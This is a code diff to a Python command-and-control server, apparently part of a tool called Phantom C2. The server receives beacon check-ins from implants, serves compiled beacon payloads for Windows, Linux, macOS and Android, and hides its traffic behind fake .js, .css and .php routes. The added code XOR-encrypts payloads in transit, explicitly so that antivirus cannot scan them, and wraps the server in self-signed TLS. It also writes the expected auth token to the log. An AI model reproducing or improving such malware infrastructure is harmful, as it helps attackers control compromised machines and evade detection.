@@ -10,16 +10,23 @@ import threading
 import json
 import base64
 import os
+import ssl
+import socket
+import ipaddress
 from datetime import datetime
 from typing import Any, Optional
 
 from aiohttp import web
+from dotenv import load_dotenv
 from phantom.core.logger import logger
 from phantom.utils.c2_crypto import (
     get_payload_token, 
     encrypt_data, 
     decrypt_data
 )
+
+# Load environment variables
+load_dotenv()
 
 
 # ── Shared State ────────────────────────────────────────────────────────────
@@ -87,10 +94,14 @@ async def handle_checkin(request: web.Request) -> web.Response:
        If POST, body contains encrypted telemetry JSON."""
     try:
         beacon_id = request.headers.get("X-Beacon-Id")
+        logger.info(f"Received check-in from {request.remote}. Headers: {dict(request.headers)}")
         if not beacon_id:
+            logger.warning(f"Checkin attempt without Beacon ID from {request.remote}")
             return web.Response(status=400)
 
-        info = {"ip": request.remote}
+        info = {"ip": request.remote, "last_seen": datetime.now().isoformat(timespec="seconds")}
+        c2_state.update_beacon(beacon_id, info)
+        logger.info(f"Beacon updated: {beacon_id}")
 
         if request.method == "POST" and request.can_read_body:
             encrypted_body = await request.text()
@@ -163,11 +174,12 @@ async def handle_payload(request: web.Request) -> web.Response:
        Requires ?auth=TOKEN or X-Auth-Token header."""
     try:
         import os
+        # Always get current token from utility to stay in sync
+        current_auth_token = get_payload_token()
         
-        # Check authentication
         token = request.query.get("auth") or request.headers.get("X-Auth-Token")
-        if token != PAYLOAD_AUTH_TOKEN:
-            logger.warning(f"Unauthorized payload request from {request.remote}")
+        if token != current_auth_token:
+            logger.warning(f"Unauthorized payload request from {request.remote}. Received: {token}, Expected: {current_auth_token}")
             return web.Response(status=403, text="Forbidden: Invalid auth token")
 
         # Map route to filename
@@ -185,7 +197,16 @@ async def handle_payload(request: web.Request) -> web.Response:
         payload_path = os.path.join(os.path.dirname(__file__), "..", "payloads", "beacon", filename)
         if not os.path.exists(payload_path):
             return web.Response(text=f"Payload '{filename}' not compiled yet.", status=404)
-        return web.FileResponse(payload_path)
+        
+        # Professional Evasion: XOR encrypt the payload before sending
+        # This prevents AV from scanning the file while it's in transit.
+        with open(payload_path, "rb") as f:
+            data = f.read()
+        
+        # Use a simple XOR key (0xAA) - for production, this would be randomized
+        encrypted_data = bytes([b ^ 0xAA for b in data])
+        
+        return web.Response(body=encrypted_data, content_type="application/octet-stream")
     except Exception as e:
         logger.error(f"Payload delivery error: {e}")
         return web.Response(status=500)
@@ -195,34 +216,89 @@ async def handle_payload(request: web.Request) -> web.Response:
 
 class C2Server:
     def __init__(self, host: str = "0.0.0.0", port: int = 443):
-        if host == "0.0.0.0":
-            logger.info("C2 Server listening on 0.0.0.0. Ensure firewall allows incoming traffic on port " + str(port))
         self.host = host
         self.port = port
-        self.app = web.Application()
-        # Check-in: Support malleable URIs (regex-like behavior)
-        self.app.router.add_get("/api/v1/ping", handle_checkin)
-        self.app.router.add_post("/api/v1/ping", handle_checkin)
-        self.app.router.add_get("/{path:.*\.js}", handle_checkin)
-        self.app.router.add_post("/{path:.*\.js}", handle_checkin)
-        self.app.router.add_get("/{path:.*\.css}", handle_checkin)
-        self.app.router.add_post("/{path:.*\.css}", handle_checkin)
-        self.app.router.add_get("/{path:.*\.ico}", handle_checkin)
-        self.app.router.add_post("/{path:.*\.ico}", handle_checkin)
-        
-        # Results
-        self.app.router.add_post("/api/v1/result", handle_result)
-        self.app.router.add_post("/{path:.*\.php}", handle_result)
-        self.app.router.add_post("/{path:.*\.aspx}", handle_result)
-        # Payload delivery (all platforms)
-        self.app.router.add_get("/api/v1/payload", handle_payload)
-        self.app.router.add_get("/api/v1/payload_linux", handle_payload)
-        self.app.router.add_get("/api/v1/payload_macos", handle_payload)
-        self.app.router.add_get("/api/v1/payload_android", handle_payload)
+        self.ssl_context: Optional[ssl.SSLContext] = None
         self.runner: Optional[web.AppRunner] = None
         self.site: Optional[web.TCPSite] = None
         self.loop: Optional[asyncio.AbstractEventLoop] = None
         self.thread: Optional[threading.Thread] = None
+
+    def _get_ssl_context(self) -> Optional[ssl.SSLContext]:
+        """Load or generate SSL context for HTTPS support."""
+        cert_dir = os.path.join(os.getcwd(), "data", "certs")
+        os.makedirs(cert_dir, exist_ok=True)
+        cert_path = os.path.join(cert_dir, "server.crt")
+        key_path = os.path.join(cert_dir, "server.key")
+        
+        if not (os.path.exists(cert_path) and os.path.exists(key_path)):
+            logger.info("SSL certificates missing. Generating self-signed certificate...")
+            try:
+                from cryptography import x509
+                from cryptography.x509.oid import NameOID
+                from cryptography.hazmat.primitives import hashes
+                from cryptography.hazmat.primitives.asymmetric import rsa
+                from cryptography.hazmat.primitives import serialization
+                import datetime as dt
+
+                # Generate key
+                key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
+                with open(key_path, "wb") as f:
+                    f.write(key.private_bytes(
+                        encoding=serialization.Encoding.PEM,
+                        format=serialization.PrivateFormat.TraditionalOpenSSL,
+                        encryption_algorithm=serialization.NoEncryption(),
+                    ))
+
+                # Generate cert
+                subject = issuer = x509.Name([
+                    x509.NameAttribute(NameOID.COUNTRY_NAME, u"US"),
+                    x509.NameAttribute(NameOID.STATE_OR_PROVINCE_NAME, u"California"),
+                    x509.NameAttribute(NameOID.LOCALITY_NAME, u"San Francisco"),
+                    x509.NameAttribute(NameOID.ORGANIZATION_NAME, u"Phantom C2"),
+                    x509.NameAttribute(NameOID.COMMON_NAME, u"phantom-c2.local"),
+                ])
+                # Generate SANs
+                alt_names = [x509.DNSName(u"localhost")]
+                if self.host and self.host != "0.0.0.0":
+                    try:
+                        addr = ipaddress.ip_address(self.host)
+                        alt_names.append(x509.IPAddress(addr))
+                    except ValueError:
+                        alt_names.append(x509.DNSName(str(self.host)))
+
+                cert = x509.CertificateBuilder().subject_name(
+                    subject
+                ).issuer_name(
+                    issuer
+                ).public_key(
+                    key.public_key()
+                ).serial_number(
+                    x509.random_serial_number()
+                ).not_valid_before(
+                    dt.datetime.utcnow()
+                ).not_valid_after(
+                    dt.datetime.utcnow() + dt.timedelta(days=365)
+                ).add_extension(
+                    x509.SubjectAlternativeName(alt_names),
+                    critical=False,
+                ).sign(key, hashes.SHA256())
+
+                with open(cert_path, "wb") as f:
+                    f.write(cert.public_bytes(serialization.Encoding.PEM))
+                
+                logger.success("Self-signed certificate generated successfully.")
+            except Exception as e:
+                logger.error(f"Failed to generate self-signed certificate: {e}")
+                return None
+
+        try:
+            context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
+            context.load_cert_chain(cert_path, key_path)
+            return context
+        except Exception as e:
+            logger.error(f"Failed to load SSL certificates: {e}")
+        return None
 
     def _setup_app(self) -> web.Application:
         app = web.Application()
@@ -256,11 +332,20 @@ class C2Server:
         # Re-create app inside the loop thread
         self.app = self._setup_app()
         
+        # Determine if we should use SSL
+        self.ssl_context = self._get_ssl_context()
+        
         self.runner = web.AppRunner(self.app, access_log=None)
         self.loop.run_until_complete(self.runner.setup())
-        self.site = web.TCPSite(self.runner, self.host, self.port)
+        
+        # Fix: Always bind to 0.0.0.0 to avoid OSError 10049 if host is non-local
+        # The provided 'host' is used for display and dropper generation.
+        bind_host = "0.0.0.0"
+        self.site = web.TCPSite(self.runner, bind_host, self.port, ssl_context=self.ssl_context)
+        
         self.loop.run_until_complete(self.site.start())
-        logger.info(f"C2 Async Server started on {self.host}:{self.port}")
+        proto = "HTTPS" if self.ssl_context else "HTTP"
+        logger.info(f"C2 Async Server ({proto}) started on {bind_host}:{self.port}")
         self.loop.run_forever()
 
     def start(self, host: Optional[str] = None, port: Optional[int] = None) -> None:
